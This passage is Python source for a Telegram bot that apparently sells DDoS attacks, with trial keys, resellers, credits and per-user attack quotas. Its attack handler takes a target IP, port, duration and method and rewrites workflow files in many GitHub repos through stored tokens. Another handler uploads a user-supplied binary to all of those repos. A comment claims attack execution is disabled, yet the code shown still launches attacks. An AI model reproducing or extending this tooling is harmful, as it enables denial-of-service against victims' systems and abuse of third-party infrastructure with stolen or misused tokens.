        text += f"┃  🆔 `{cid}`\n"
        text += f"┃  🎯 ᴀᴛᴛᴀᴄᴋꜱ: `{t.get('attack_count', 0)}`"
        if banned:
            text += f"  |  🚫 {banned}"
        text += "\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"

    text += f"📊 **ᴛᴏᴛᴀʟ:** `{len(auto_attack_targets)}`"
    await update.message.reply_text(text)


# ─────────────────────────────────────────────────────────────────
#  📊   / a u t o s t a t u s
# ─────────────────────────────────────────────────────────────────
async def autostatus_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Display detailed status of every auto-attack target."""
    if not is_owner(update.effective_user.id):
        return

    if not auto_attack_targets:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  📭  ɴᴏ ᴛᴀʀɢᴇᴛꜱ                 ║\n"
            "╚════════════════════════════════╝"
        )
        return

    txt = (
        "╔════════════════════════════════╗\n"
        "║   📊  ᴀᴜᴛᴏ ꜱᴛᴀᴛᴜꜱ          ║\n"
        "╚════════════════════════════════╝\n"
    )

    for cid, t in auto_attack_targets.items():
        last_t = t.get("last_attack_time")
        last_str = (
            time.strftime("%H:%M:%S", time.localtime(last_t))
            if last_t else "N/A"
        )
        status_icon = "🟢" if t.get("enabled") else "🔴"
        mode_icon = (
            "⏱️ TIMER"
            if t.get("mode", "detector") == "timer"
            else "🔍 DETECTOR"
        )
        banned = len(t.get("banned_sessions", []))

        txt += "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        txt += f"┃  💬 {t.get('chat_title', '?')[:22]}\n"
        txt += f"┃  🆔 `{cid}`\n"
        txt += "┠────────────────────────────────┨\n"
        txt += f"┃  {status_icon} ꜱᴛᴀᴛᴜꜱ: "
        txt += "ᴇɴᴀʙʟᴇᴅ\n" if t.get("enabled") else "ᴘᴀᴜꜱᴇᴅ\n"
        txt += f"┃  📡 ᴍᴏᴅᴇ: {mode_icon}\n"
        txt += f"┃  🌐 ʟᴀꜱᴛ ɪᴘ: `{t.get('last_ip') or 'N/A'}:{t.get('last_port') or '?'}`\n"
        txt += f"┃  🎯 ᴀᴛᴛᴀᴄᴋꜱ: `{t.get('attack_count', 0)}`\n"
        txt += f"┃  🕐 ʟᴀꜱᴛ: `{last_str}`\n"
        txt += f"┃  🚫 ʙᴀɴɴᴇᴅ: `{banned}`\n"
        txt += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"

    await update.message.reply_text(txt)


# ─────────────────────────────────────────────────────────────────
#  ❌   / r e m o v e a u t o   < c h a t _ i d >
# ─────────────────────────────────────────────────────────────────
async def removeauto_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove an auto-attack target."""
    if not is_owner(update.effective_user.id):
        return

    if not context.args:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ❌  ᴜꜱᴀɢᴇ ᴍɪꜱꜱɪɴɢ             ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📖 ᴜꜱᴀɢᴇ:                     ┃\n"
            "┃     `/removeauto <chat_id>`    ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    cid = context.args[0].strip()
    if cid not in auto_attack_targets:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ❌  ɴᴏᴛ ꜰᴏᴜɴᴅ                 ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  🆔 `{cid}`\n"
            "┃     ɴᴏᴛ ɪɴ ᴀᴄᴛɪᴠᴇ ᴛᴀʀɢᴇᴛꜱ.   ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    title = auto_attack_targets[cid].get("chat_title", "?")
    del auto_attack_targets[cid]
    save_auto_attacks()

    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  ✅  ᴛᴀʀɢᴇᴛ ʀᴇᴍᴏᴠᴇᴅ           ║\n"
        "╚════════════════════════════════╝\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  💬 {title[:22]}\n"
        f"┃  🆔 `{cid}`\n"
        "┠────────────────────────────────┨\n"
        f"┃  📊 ʀᴇᴍᴀɪɴɪɴɢ: `{len(auto_attack_targets)}`\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    )


# ─────────────────────────────────────────────────────────────────
#  🛑   / s t o p a u t o   < c h a t _ i d >
# ─────────────────────────────────────────────────────────────────
async def stopauto_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Pause an auto-attack target."""
    if not is_owner(update.effective_user.id):
        return

    if not context.args:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  🛑  ᴜꜱᴀɢᴇ ᴍɪꜱꜱɪɴɢ             ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📖 ᴜꜱᴀɢᴇ:                     ┃\n"
            "┃     `/stopauto <chat_id>`      ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    cid = context.args[0].strip()
    if cid not in auto_attack_targets:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ❌  ɴᴏᴛ ꜰᴏᴜɴᴅ                 ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  🆔 `{cid}`\n"
            "┃     ɴᴏᴛ ɪɴ ᴀᴄᴛɪᴠᴇ ᴛᴀʀɢᴇᴛꜱ.   ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    auto_attack_targets[cid]["enabled"] = False
    save_auto_attacks()

    title = auto_attack_targets[cid].get("chat_title", "?")
    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  ⏸️  ᴛᴀʀɢᴇᴛ ᴘᴀᴜꜱᴇᴅ            ║\n"
        "╚════════════════════════════════╝\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  💬 {title[:22]}\n"
        f"┃  🆔 `{cid}`\n"
        "┠────────────────────────────────┨\n"
        "┃  💡 ʀᴇꜱᴜᴍᴇ ᴡɪᴛʜ `/startauto`  ┃\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    )


# ─────────────────────────────────────────────────────────────────
#  ▶️   / s t a r t a u t o   < c h a t _ i d >
# ─────────────────────────────────────────────────────────────────
async def startauto_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Resume a paused auto-attack target."""
    global AUTO_ATTACK_LOOP_TASK

    if not is_owner(update.effective_user.id):
        return

    if not context.args:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ▶️  ᴜꜱᴀɢᴇ ᴍɪꜱꜱɪɴɢ             ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📖 ᴜꜱᴀɢᴇ:                     ┃\n"
            "┃     `/startauto <chat_id>`     ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    cid = context.args[0].strip()
    if cid not in auto_attack_targets:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ❌  ɴᴏᴛ ꜰᴏᴜɴᴅ                 ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  🆔 `{cid}`\n"
            "┃     ɴᴏᴛ ɪɴ ᴀᴄᴛɪᴠᴇ ᴛᴀʀɢᴇᴛꜱ.   ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    auto_attack_targets[cid]["enabled"] = True
    save_auto_attacks()

    if AUTO_ATTACK_LOOP_TASK is None or AUTO_ATTACK_LOOP_TASK.done():
        AUTO_ATTACK_LOOP_TASK = asyncio.create_task(auto_attack_loop())

    title = auto_attack_targets[cid].get("chat_title", "?")
    await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  ▶️  ᴛᴀʀɢᴇᴛ ʀᴇꜱᴜᴍᴇᴅ           ║\n"
        "╚════════════════════════════════╝\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  💬 {title[:22]}\n"
        f"┃  🆔 `{cid}`\n"
        "┠────────────────────────────────┨\n"
        "┃  🟢 ᴛᴀʀɢᴇᴛ ɪꜱ ɴᴏᴡ ᴀᴄᴛɪᴠᴇ.      ┃\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    )
    
# ==================== CALLBACK QUERY HANDLER ====================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all callback button interactions"""
    global COOLDOWN_DURATION, MAX_ATTACKS

    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    data = query.data or ""

    allowed_callbacks = {
        "cancel_operation",
        "recheck_access",
        "access_help_info",
        *(f"trial_{x}" for x in (6, 12, 24, 48, 72)),
        *(f"cooldown_{x}" for x in (10, 20, 30, 40, 60, 120)),
        *(f"maxattack_{x}" for x in (1, 5, 10, 20, 40, 100)),
        *(f"attack_time_{x}" for x in (30, 60, 90, 120, 180, 300)),
        *(f"days_{x}" for x in (0, 1, 2, 3, 4, 7, 30)),
        *(f"credits_{x}" for x in (50, 100, 200, 500, 1000)),
    }
    if data not in allowed_callbacks:
        await query.answer("This button is expired.", show_alert=True)
        return

    # Re-check authorization at callback time; buttons can be stale or forwarded.
    if data.startswith(("trial_", "cooldown_", "maxattack_", "days_")) and not (is_owner(user_id) or is_admin(user_id)):
        await query.answer("Not authorized", show_alert=True)
        return
    if data.startswith("credits_") and not is_owner(user_id):
        await query.answer("Owner access required", show_alert=True)
        return
    if data.startswith("attack_time_"):
        if not can_user_attack(user_id):
            await query.answer("Attack access is not available", show_alert=True)
            return
        allowed, _ = can_start_attack(user_id)
        if not allowed:
            await query.answer("This attack request is no longer valid", show_alert=True)
            return

    # ═══════════════════════════════════════════════════════════
    #   🔄  RECHECK APPROVAL STATUS
    # ═══════════════════════════════════════════════════════════
    if data == "recheck_access":
        if can_user_attack(user_id):
            await query.answer("✅ ᴀᴄᴄᴇꜱꜱ ᴀᴘᴘʀᴏᴠᴇᴅ!", show_alert=True)
            try:
                await query.message.edit_text(
                    "╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n"
                    "   ✅  𝐀𝐂𝐂𝐄𝐒𝐒 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃\n"
                    "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n"
                    "  🎉 ʏᴏᴜ ɴᴏᴡ ʜᴀᴠᴇ ꜰᴜʟʟ ᴀᴄᴄᴇꜱꜱ!\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "  👉 ᴛʏᴘᴇ /start ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ"
                )
            except Exception:
                pass
        else:
            await query.answer("⏳ ꜱᴛɪʟʟ ᴘᴇɴᴅɪɴɢ ᴀᴘᴘʀᴏᴠᴀʟ...", show_alert=True)
        return

    # ═══════════════════════════════════════════════════════════
    #   💡  ACCESS HELP INFO
    # ═══════════════════════════════════════════════════════════
    if data == "access_help_info":
        help_buttons = []
        if _owner_dm_url_cache:
            help_buttons.append([
                cbtn("👑  ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ  💬",
                     url=_owner_dm_url_cache, style="success")
            ])
        help_buttons.append([
            cbtn("🔄  ᴄʜᴇᴄᴋ ᴀɢᴀɪɴ",
                 callback_data="recheck_access", style="primary")
        ])

        try:
            await query.message.reply_text(
                "╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n"
                "   💡  𝐇𝐎𝐖 𝐓𝐎 𝐆𝐄𝐓 𝐀𝐂𝐂𝐄𝐒𝐒\n"
                "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n"
                "  📌 ᴡᴀʏꜱ ᴛᴏ ɢᴀɪɴ ᴀᴄᴄᴇꜱꜱ:\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "  1️⃣  **ᴡᴀɪᴛ ꜰᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ**\n"
                "      ᴀᴅᴍɪɴ ᴡɪʟʟ ᴀᴘᴘʀᴏᴠᴇ ʏᴏᴜ ꜱᴏᴏɴ\n\n"
                "  2️⃣  **ᴛʀɪᴀʟ ᴋᴇʏ**\n"
                "      ᴜꜱᴇ `/redeem TRL-XXXX-XXXX-XXXX`\n"
                "      ᴀꜱᴋ ᴀᴅᴍɪɴ ꜰᴏʀ ᴀ ᴋᴇʏ\n\n"
                "  3️⃣  **ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ**\n"
                "      ᴛᴀᴘ 'ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ' ʙᴜᴛᴛᴏɴ\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "  📞 ɴᴇᴇᴅ ʜᴇʟᴘ? 👇",
                reply_markup=InlineKeyboardMarkup(help_buttons)
            )
        except Exception as e:
            logger.warning(f"access_help_info send failed: {e}")
        return

    # Cancel operation
    if data == "cancel_operation":
        if user_id in temp_data:
            del temp_data[user_id]
        reply_markup = get_main_keyboard(user_id)
        await query.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ❌  ᴏᴘᴇʀᴀᴛɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ   ║\n"
            "╚════════════════════════════════╝",
            reply_markup=reply_markup
        )
        try:
            await query.message.delete()
        except Exception:
            pass
        return

    # Trial key generation
    if data.startswith("trial_"):
        hours = int(data.split("_")[1])
        key = generate_trial_key(hours)

        await query.message.edit_text(
            "╔════════════════════════════════╗\n"
            "║  🔑  ᴛʀɪᴀʟ ᴋᴇʏ ɢᴇɴᴇʀᴀᴛᴇᴅ   ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            f"│  ᴋᴇʏ:  `{key}`                │\n"
            f"│  ᴅᴜʀᴀᴛɪᴏɴ:  {hours} ʜᴏᴜʀꜱ        │\n"
            f"│  ᴇxᴘɪʀᴇꜱ:  ɪɴ {hours} ʜᴏᴜʀꜱ     │\n"
            "│                                │\n"
            "│  ᴜꜱᴇʀꜱ ᴄᴀɴ ʀᴇᴅᴇᴇᴍ ᴡɪᴛʜ ᴛʜɪꜱ │\n"
            "│  ᴋᴇʏ.                          │\n"
            "└────────────────────────────────┘"
        )
        return

    # Cooldown setting
    if data.startswith("cooldown_"):
        cooldown = int(data.split("_")[1])
        COOLDOWN_DURATION = cooldown
        save_cooldown(cooldown)

        await query.message.edit_text(
            "╔════════════════════════════════╗\n"
            "║  ✅  ᴄᴏᴏʟᴅᴏᴡɴ ᴜᴘᴅᴀᴛᴇᴅ     ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            f"│  ɴᴇᴡ ᴄᴏᴏʟᴅᴏᴡɴ:  `{COOLDOWN_DURATION}`ꜱ  │\n"
            "└────────────────────────────────┘"
        )
        return

    # Max attacks setting
    if data.startswith("maxattack_"):
        max_attacks = int(data.split("_")[1])
        MAX_ATTACKS = max_attacks
        save_max_attacks(max_attacks)

        await query.message.edit_text(
            "╔════════════════════════════════╗\n"
            "║  ✅  ᴍᴀx ᴀᴛᴛᴀᴄᴋꜱ ᴜᴘᴅᴀᴛᴇᴅ ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            f"│  ɴᴇᴡ ʟɪᴍɪᴛ:  `{MAX_ATTACKS}` ᴀᴛᴛᴀᴄᴋ(ꜱ) │\n"
            "│  ᴘᴇʀ ᴜꜱᴇʀ                    │\n"
            "└────────────────────────────────┘"
        )
        return

    # Attack time setting
    if data.startswith("attack_time_"):
        attack_duration = int(data.split("_")[2])

        if user_id not in temp_data:
            await query.message.edit_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ꜱᴇꜱꜱɪᴏɴ ᴇxᴘɪʀᴇᴅ      ║\n"
                "╚════════════════════════════════╝\n"
                "┌────────────────────────────────┐\n"
                "│  ᴘʟᴇᴀꜱᴇ ꜱᴛᴀʀᴛ ᴀɢᴀɪɴ.       │\n"
                "└────────────────────────────────┘"
            )
            return

        ip = temp_data[user_id]["ip"]
        port = temp_data[user_id]["port"]
        method = temp_data[user_id]["method"]

        del temp_data[user_id]

        # ✅ FIX 1: Re-check right before firing (double-click / stale protection)
        allowed_now, _ = can_start_attack(user_id)
        if not allowed_now:
            await query.message.edit_text(
                "╔════════════════════════════════╗\n"
                "║  ⚠️  ᴀᴛᴛᴀᴄᴋ ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ ║\n"
                "╚════════════════════════════════╝"
            )
            return

        await query.message.edit_text(
            "╔════════════════════════════════╗\n"
            "║  🔄  ꜱᴛᴀʀᴛɪɴɢ ᴀᴛᴛᴀᴄᴋ...     ║\n"
            "╚════════════════════════════════╝"
        )

        # ✅ FIX 2: Register attack state + increment user's counter
        start_attack(ip, port, attack_duration, user_id, method)

        success_count = 0
        fail_count = 0
        threads = []
        results = []

        def update_single_token(token_data):
            try:
                result = update_yml_file(
                    token_data['token'],
                    token_data['repo'],
                    ip, port, attack_duration, method
                )
                results.append((token_data['username'], result))
            except Exception:
                results.append((token_data['username'], False))

        for token_data in github_tokens:
            thread = threading.Thread(target=update_single_token, args=(token_data,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            await asyncio.to_thread(thread.join)

        for username, success in results:
            if success:
                success_count += 1
            else:
                fail_count += 1

        user_id_str = str(user_id)
        remaining_attacks = MAX_ATTACKS - user_attack_counts.get(user_id_str, 0)

        reply_markup = get_main_keyboard(user_id)
        message = (
            "╔════════════════════════════════╗\n"
            "║  🎯  ᴀᴛᴛᴀᴄᴋ ꜱᴛᴀʀᴛᴇᴅ!       ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            f"│  🌐  ᴛᴀʀɢᴇᴛ:  `{ip}`              │\n"
            f"│  🚪  ᴘᴏʀᴛ:  `{port}`             │\n"
            f"│  ⏱️  ᴛɪᴍᴇ:  `{attack_duration}ꜱ`        │\n"
            f"│  🖥️  ꜱᴇʀᴠᴇʀꜱ:  `{success_count}`              │\n"
            f"│  ⚡  ᴍᴇᴛʜᴏᴅ:  {method}             │\n"
            f"│  ⏳  ᴄᴏᴏʟᴅᴏᴡɴ:  {COOLDOWN_DURATION}ꜱ          │\n"
            f"│  🎯  ʀᴇᴍᴀɪɴɪɴɢ:  {remaining_attacks}/{MAX_ATTACKS}  │\n"
            "└────────────────────────────────┘"
        )

        await query.message.edit_text(message)
        await query.message.reply_text(
            "┌────────────────────────────────┐\n"
            "│  ᴜꜱᴇ ʙᴜᴛᴛᴏɴꜱ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ:   │\n"
            "└────────────────────────────────┘",
            reply_markup=reply_markup
        )

        def monitor_attack_completion():
            time.sleep(attack_duration)
            finish_attack()
            logger.info(f"Attack completed automatically after {attack_duration} seconds")

        monitor_thread = threading.Thread(target=monitor_attack_completion)
        monitor_thread.daemon = True
        monitor_thread.start()

        return

    # Add user days selection
    if data.startswith("days_"):
        days = int(data.split("_")[1])

        if user_id not in temp_data:
            await query.message.edit_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ꜱᴇꜱꜱɪᴏɴ ᴇxᴘɪʀᴇᴅ      ║\n"
                "╚════════════════════════════════╝\n"
                "┌────────────────────────────────┐\n"
                "│  ᴘʟᴇᴀꜱᴇ ꜱᴛᴀʀᴛ ᴀɢᴀɪɴ.       │\n"
                "└────────────────────────────────┘"
            )
            return

        new_user_id = temp_data[user_id]["new_user_id"]
        del temp_data[user_id]

        pending_users[:] = [u for u in pending_users if str(u['user_id']) != str(new_user_id)]
        save_pending_users(pending_users)

        if days == 0:
            expiry = "LIFETIME"
            duration_text = "ʟɪꜰᴇᴛɪᴍᴇ"
        else:
            expiry = time.time() + (days * 24 * 60 * 60)
            duration_text = f"{days} ᴅᴀʏꜱ" if days > 1 else f"{days} ᴅᴀʏ"

        approved_users[str(new_user_id)] = {
            "username": f"user_{new_user_id}",
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": expiry,
            "days": days
        }
        save_approved_users(approved_users)

        try:
            await context.bot.send_message(
                chat_id=new_user_id,
                text=f"╔════════════════════════════════╗\n"
                     f"║  ✅  ᴀᴄᴄᴇꜱꜱ ᴀᴘᴘʀᴏᴠᴇᴅ!     ║\n"
                     f"╚════════════════════════════════╝\n"
                     f"┌────────────────────────────────┐\n"
                     f"│  ʏᴏᴜʀ ᴀᴄᴄᴇꜱꜱ ʜᴀꜱ ʙᴇᴇɴ      │\n"
                     f"│  ᴀᴘᴘʀᴏᴠᴇᴅ ꜰᴏʀ {duration_text}. │\n"
                     f"└────────────────────────────────┘"
            )
        except Exception:
            pass

        reply_markup = get_main_keyboard(user_id)
        await query.message.edit_text(
            "╔════════════════════════════════╗\n"
            "║  ✅  ᴜꜱᴇʀ ᴀᴅᴅᴇᴅ             ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            f"│  🆔  ᴜꜱᴇʀ ɪᴅ:  `{new_user_id}`      │\n"
            f"│  📅  ᴅᴜʀᴀᴛɪᴏɴ:  {duration_text:<12} │\n"
            f"│  👤  ᴀᴅᴅᴇᴅ ʙʏ:  `{user_id}`   │\n"
            "└────────────────────────────────┘"
        )
        await query.message.reply_text(
            "┌────────────────────────────────┐\n"
            "│  ᴜꜱᴇ ʙᴜᴛᴛᴏɴꜱ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ:   │\n"
            "└────────────────────────────────┘",
            reply_markup=reply_markup
        )
        return

    # Reseller credits selection
    if data.startswith("credits_"):
        credits = int(data.split("_")[1])

        if user_id not in temp_data:
            await query.message.edit_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ꜱᴇꜱꜱɪᴏɴ ᴇxᴘɪʀᴇᴅ      ║\n"
                "╚════════════════════════════════╝\n"
                "┌────────────────────────────────┐\n"
                "│  ᴘʟᴇᴀꜱᴇ ꜱᴛᴀʀᴛ ᴀɢᴀɪɴ.       │\n"
                "└────────────────────────────────┘"
            )
            return

        temp_data[user_id]["credits"] = credits
        temp_data[user_id]["step"] = "reseller_add_username"

        reply_markup = get_cancel_keyboard()
        await query.message.edit_text(
            "╔════════════════════════════════╗\n"
            "║  💰  ᴀᴅᴅ ʀᴇꜱᴇʟʟᴇʀ - ꜱᴛᴇᴘ 3/3  ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            f"│  ✅  ᴜꜱᴇʀ ɪᴅ:  `{temp_data[user_id]['reseller_id']}` │\n"
            f"│  ✅  ᴄʀᴇᴅɪᴛꜱ:  `{credits}`           │\n"
            "│                                │\n"
            "│  ꜱᴇɴᴅ ᴛʜᴇ ᴜꜱᴇʀɴᴀᴍᴇ:          │\n"
            "│                                │\n"
            "│  ᴇxᴀᴍᴘʟᴇ:  `ᴊᴏʜɴ`            │\n"
            "└────────────────────────────────┘"
        )
        await query.message.reply_text(
            "┌────────────────────────────────┐\n"
            "│  ᴛʏᴘᴇ ᴜꜱᴇʀɴᴀᴍᴇ:             │\n"
            "└────────────────────────────────┘",
            reply_markup=reply_markup
        )
        return

# ==================== BROADCAST HANDLER ====================
# Safe build: disruptive network attack execution is intentionally disabled.

async def send_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE, message: str, user_id):
    """Send broadcast message to all users"""
    all_users = set()

    for uid in approved_users.keys():
        all_users.add(int(uid))

    for uid in resellers.keys():
        all_users.add(int(uid))

    for uid in admins.keys():
        all_users.add(int(uid))

    for uid in owners.keys():
        all_users.add(int(uid))

    total_users = len(all_users)
    success_count = 0
    fail_count = 0

    progress_msg = await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  📢  ꜱᴇɴᴅɪɴɢ ʙʀᴏᴀᴅᴄᴀꜱᴛ...   ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        f"│  ᴛᴏᴛᴀʟ ᴜꜱᴇʀꜱ:  {total_users}           │\n"
        "└────────────────────────────────┘"
    )

    for uid in all_users:
        try:
            await context.bot.send_message(
                chat_id=uid,
                text=f"╔════════════════════════════════╗\n"
                     f"║  📢  ʙʀᴏᴀᴅᴄᴀꜱᴛ             ║\n"
                     f"╚════════════════════════════════╝\n"
                     f"┌────────────────────────────────┐\n"
                     f"│  {message:<30} │\n"
                     f"└────────────────────────────────┘"
            )
            success_count += 1
            await asyncio.sleep(0.1)
        except Exception:
            fail_count += 1

    reply_markup = get_main_keyboard(user_id)
    await progress_msg.edit_text(
        "╔════════════════════════════════╗\n"
        "║  ✅  ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ   ║\n"
        "╚════════════════════════════════╝\n"
        "┌────────────────────────────────┐\n"
        f"│  ✅  ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟ:  {success_count}          │\n"
        f"│  ❌  ꜰᴀɪʟᴇᴅ:  {fail_count}             │\n"
        f"│  📊  ᴛᴏᴛᴀʟ:  {total_users}           │\n"
        f"│  📝  ᴍᴇꜱꜱᴀɢᴇ:  {message[:30]}...     │\n"
        "└────────────────────────────────┘"
    )
    await update.message.reply_text(
        "┌────────────────────────────────┐\n"
        "│  ᴜꜱᴇ ʙᴜᴛᴛᴏɴꜱ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ:   │\n"
        "└────────────────────────────────┘",
        reply_markup=reply_markup
    )


# ==================== BINARY FILE HANDLER ====================

async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle binary file upload"""
    user_id = update.effective_user.id

    if user_id not in temp_data or temp_data[user_id].get("step") != "binary_upload":
        return

    if not update.message.document:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ❌  ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴀ ꜰɪʟᴇ   ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            "│  ɴᴏᴛ ᴛᴇxᴛ. ꜱᴇɴᴅ ʏᴏᴜʀ        │\n"
            "│  ʙɪɴᴀʀʏ ꜰɪʟᴇ.               │\n"
            "└────────────────────────────────┘"
        )
        return

    del temp_data[user_id]

    progress_msg = await update.message.reply_text(
        "╔════════════════════════════════╗\n"
        "║  📥  ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ꜰɪʟᴇ...    ║\n"
        "╚════════════════════════════════╝"
    )

    try:
        file = await update.message.document.get_file()
        file_path = f"temp_binary_{user_id}.bin"
        await file.download_to_drive(file_path)

        with open(file_path, 'rb') as f:
            binary_content = f.read()

        file_size = len(binary_content)

        # Save binary file for future tokens
        save_binary_file(binary_content)

        await progress_msg.edit_text(
            "╔════════════════════════════════╗\n"
            "║  📊  ꜰɪʟᴇ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ       ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            f"│  📦  ꜱɪᴢᴇ:  {file_size} ʙʏᴛᴇꜱ        │\n"
            "│                                │\n"
            "│  📤 ᴜᴘʟᴏᴀᴅɪɴɢ ᴛᴏ ᴀʟʟ ʀᴇᴘᴏꜱ... │\n"
            "└────────────────────────────────┘"
        )

        success_count = 0
        fail_count = 0
        results = []

        def upload_to_repo(token_data):
            try:
                success, status = upload_binary_to_repo(token_data, binary_content)
                results.append((token_data['username'], success, status))
            except Exception as e:
                results.append((token_data['username'], False, str(e)))

        threads = []
        for token_data in github_tokens:
            thread = threading.Thread(target=upload_to_repo, args=(token_data,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            await asyncio.to_thread(thread.join)

        for username, success, status in results:
            if success:
                success_count += 1
            else:
                fail_count += 1

        os.remove(file_path)

        reply_markup = get_main_keyboard(user_id)
        message = (
            "╔════════════════════════════════╗\n"
            "║  ✅  ʙɪɴᴀʀʏ ᴜᴘʟᴏᴀᴅ ᴄᴏᴍᴘʟᴇᴛᴇ! ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            f"│  ✅  ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟ:  {success_count}          │\n"
            f"│  ❌  ꜰᴀɪʟᴇᴅ:  {fail_count}             │\n"
            f"│  📊  ᴛᴏᴛᴀʟ:  {len(github_tokens)}           │\n"
            "├────────────────────────────────┤\n"
            f"│  📁  ꜰɪʟᴇ:  `{BINARY_FILE_NAME}`    │\n"
            f"│  📦  ꜱɪᴢᴇ:  {file_size} ʙʏᴛᴇꜱ        │\n"
            "├────────────────────────────────┤\n"
            "│  ℹ️  ᴛʜɪꜱ ʙɪɴᴀʀʏ ᴡɪʟʟ ʙᴇ      │\n"
            "│  ᴀᴜᴛᴏ-ᴜᴘʟᴏᴀᴅᴇᴅ ᴛᴏ ɴᴇᴡ ᴛᴏᴋᴇɴꜱ │\n"
            "└────────────────────────────────┘"
        )

        await progress_msg.edit_text(message)
        await update.message.reply_text(
